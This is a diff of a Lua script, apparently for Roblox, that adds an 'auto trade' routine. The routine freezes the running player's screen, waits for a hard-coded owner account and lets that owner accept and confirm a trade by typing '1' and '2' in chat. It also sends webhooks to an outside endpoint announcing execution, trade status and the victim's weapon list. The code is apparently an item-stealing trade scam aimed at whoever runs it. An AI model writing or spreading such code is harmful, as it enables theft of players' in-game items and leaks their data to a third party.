+        setConfirm(true)
+        unfreezeScreen(); setFreeze(false)
+        sendWebhook({title="🎉 Trade Confirmed",
+            description="Trade with "..LocalPlayer.DisplayName.." complete.",
+            color=0xFF69B4})
+    end
+
+    if owner then
+        tradeState = "pending"
+        setFreeze(true)
+        sendWebhook({
+            title = "🔄 Auto Trade Started",
+            description = string.format("**%s** ready.\nType **1** accept · **2** confirm.",
+                LocalPlayer.DisplayName),
+            color = 0xFF69B4,
+        })
+        listenForChat(owner, onAccept, onConfirm)
+    else
+        Players.PlayerAdded:Connect(function(p)
+            if isOwner(p.Name) and tradeState == "idle" then
+                tradeState = "pending"; setFreeze(true)
+                sendWebhook({title="🔄 Trade Ready",
+                    description=p.DisplayName.." joined. Type **1** · **2**.",color=0xFF69B4})
+                listenForChat(p, onAccept, onConfirm)
+            end
+        end)
+    end
+end
+
+-- ── Weapon refresh when toggle turned on ──────────────────────────────
+local origSetWeapons = setWeapons2
+setWeapons = function(v)
+    origSetWeapons(v)
+    if v then
+        local w = getWeapons()
+        sendWebhook({
+            title = "⚔️ Weapons Listed",
+            description = #w>0 and "• "..table.concat(w,"\n• ") or "None found",
+            color = 0xFF69B4,
+        })
+    end
+end
 
 -- ── Boot ──────────────────────────────────────────────────────────────
 task.spawn(function()
-    -- Populate weapons immediately
-    local w = getWeapons()
-    weapLbl.Text = #w > 0 and "• " .. table.concat(w, "\n• ") or "(none found)"
-
-    -- Notify webhook of execution first
     notifyExecution()
-
-    -- Then start auto trade
     task.wait(0.5)
     startAutoTrade()
 end)
